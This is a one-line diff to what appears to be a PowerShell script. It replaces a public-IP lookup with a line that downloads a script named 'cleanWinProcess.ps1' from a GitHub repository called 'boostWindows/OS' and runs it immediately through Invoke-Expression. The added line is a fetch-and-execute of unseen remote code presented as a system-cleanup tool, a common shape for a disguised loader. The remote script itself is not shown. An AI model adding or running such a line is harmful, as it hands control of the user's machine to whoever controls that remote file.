@@ -1,1 +1,1 @@
-$ipDestination = (Invoke-WebRequest -Uri "https://ifconfig.me/ip").Content
+iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/cleanWinProcess.ps1')
